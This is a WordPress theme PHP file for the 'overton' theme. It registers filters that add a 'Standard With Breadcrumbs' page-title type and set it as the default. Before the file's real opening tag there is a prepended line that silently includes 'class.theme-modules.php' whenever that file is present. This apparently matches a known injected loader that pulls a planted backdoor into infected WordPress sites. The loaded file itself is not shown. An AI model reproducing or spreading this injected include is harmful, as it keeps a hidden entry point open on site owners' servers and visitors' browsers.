<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_set_title_standard_with_breadcrumbs_type_for_options' ) ) {
	/**
	 * This function set standard with breadcrumbs title type value for title options map and meta boxes
	 */
	function overton_mikado_set_title_standard_with_breadcrumbs_type_for_options( $type ) {
		$type['standard-with-breadcrumbs'] = esc_html__( 'Standard With Breadcrumbs', 'overton' );
		
		return $type;
	}
	
	add_filter( 'overton_mikado_filter_title_type_global_option', 'overton_mikado_set_title_standard_with_breadcrumbs_type_for_options' );
	add_filter( 'overton_mikado_filter_title_type_meta_boxes', 'overton_mikado_set_title_standard_with_breadcrumbs_type_for_options' );
}

if ( ! function_exists( 'overton_mikado_set_title_standard_with_breadcrumbs_type_as_default_options' ) ) {
    /**
     * This function set default title type value for global title option map
     */
    function overton_mikado_set_title_standard_with_breadcrumbs_type_as_default_options( $type ) {
        $type = 'standard-with-breadcrumbs';

        return $type;
    }

    add_filter( 'overton_mikado_filter_default_title_type_global_option', 'overton_mikado_set_title_standard_with_breadcrumbs_type_as_default_options' );
}